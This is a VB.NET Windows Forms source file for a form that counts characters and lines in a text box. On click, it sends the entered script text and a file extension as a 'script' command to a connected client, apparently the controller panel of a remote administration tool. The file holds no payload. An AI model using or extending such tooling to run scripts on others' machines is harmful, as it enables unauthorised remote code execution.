Imports System.Runtime.InteropServices
Imports System.ComponentModel

Public Class Form38
    Public xxx As Integer
    Public f As Form1

    Public WithEvents bw As BackgroundWorker = New BackgroundWorker
    Dim state As Integer
    Dim time As Integer

    Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseMove
        PictureBox2.Show()
        PictureBox1.Hide()

    End Sub


    Private Sub fun_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        PictureBox2.Hide()
        PictureBox1.Show()


        On Error Resume Next
        Dim xtt$ = TextBox8.Text
        ToolStripStatusLabel2.Text = " / The Number Of Characters[ 0 ]".Replace("0", xtt.Length)
        ToolStripStatusLabel1.Text = "Line:[ " & TextBox8.Lines.Length & " ]"



    End Sub

    Private Sub Panel1_MouseMove(sender As Object, e As MouseEventArgs) Handles Panel1.MouseMove
        PictureBox2.Hide()
        PictureBox1.Show()
    End Sub

    Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Panel1.Paint

    End Sub

    Private Sub TextBox8_MouseMove(sender As Object, e As MouseEventArgs) Handles TextBox8.MouseMove
        PictureBox2.Hide()
        PictureBox1.Show()
    End Sub

    Private Sub TextBox8_TextChanged(sender As Object, e As EventArgs) Handles TextBox8.TextChanged
        On Error Resume Next

        Dim xtt$ = TextBox8.Text
        ToolStripStatusLabel2.Text = " / The Number Of Characters[ 0 ]".Replace("0", xtt.Length)
        ToolStripStatusLabel1.Text = "Line:[ " & TextBox8.Lines.Length & " ]"

    End Sub

    Private Sub Panel2_MouseMove(sender As Object, e As MouseEventArgs) Handles Panel2.MouseMove
        PictureBox2.Hide()
        PictureBox1.Show()
    End Sub

    Private Sub Panel2_Paint(sender As Object, e As PaintEventArgs) Handles Panel2.Paint

    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        If TextBox8.Text = "" Then
            MsgBox("Empty text", MsgBoxStyle.Exclamation)
        Else
      
            Dim ex As String = ""
            If ComboBox1.Text = "" Then
                MsgBox("Error")
            Else
                ComboBox1.Text = ComboBox1.Text.Replace(".", "")
                ex = "." + ComboBox1.Text
            End If

            Form1.S.Send(xxx, "script" & Form1.Yy & TextBox8.Text & Form1.Yy & ex)
        End If

    End Sub

    Private Sub ToolStripStatusLabel1_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel1.Click

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

    End Sub
End Class